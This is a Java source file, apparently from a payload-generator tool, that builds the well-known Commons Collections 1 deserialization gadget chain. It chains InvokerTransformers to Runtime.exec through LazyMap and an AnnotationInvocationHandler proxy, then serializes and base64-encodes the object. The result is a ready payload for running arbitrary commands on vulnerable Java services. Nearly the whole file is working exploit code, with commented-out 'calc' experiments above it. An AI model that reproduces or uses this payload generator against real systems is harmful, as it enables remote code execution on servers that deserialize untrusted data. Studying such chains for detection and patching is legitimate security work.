package org.hasret.webserigen.payloads;



//lazymap 这一条  cc1的两种

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;



import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections0 {
    public static  void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
//        String s = generatePayload("calc");
        //Runtime r = Runtime.getRuntime();
//     //new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"}).transform(r);
//        InvokerTransformer invokertransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object,Object> map = new HashMap();
//        map.put("key","value");
//        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, invokertransformer);

        //Class c = Runtime.class;
        //Method getRuntime = c.getDeclaredMethod("getRuntime", null);
        //    Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        //Runtime r = (Runtime) getRuntime.invoke(null,null);
        //    Method invokeMethod = (Method) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
        //Method execmethod = c.getDeclaredMethod("exec", new Class[]{String.class, String.class});
        //    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);
//        execmethod.setAccessible(true);
//        execmethod.invoke(r,"calc");
    }

    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        final String[] execArgs = new String[]{cmd};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//      chainedTransformer.transform(Runtime.class);
        HashMap<Object,Object> hashMap = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstrutor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstrutor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstrutor.newInstance(Override.class,lazyMap);

        Map mapProxy =(Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, h);

        Object o = annotationInvocationhdlConstrutor.newInstance(Override.class, mapProxy);

        String b64payload = serializeBytesToB64(o);

        return b64payload;
    }

    public static String serializeBytesToB64(Object obj) throws IOException {
        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
}
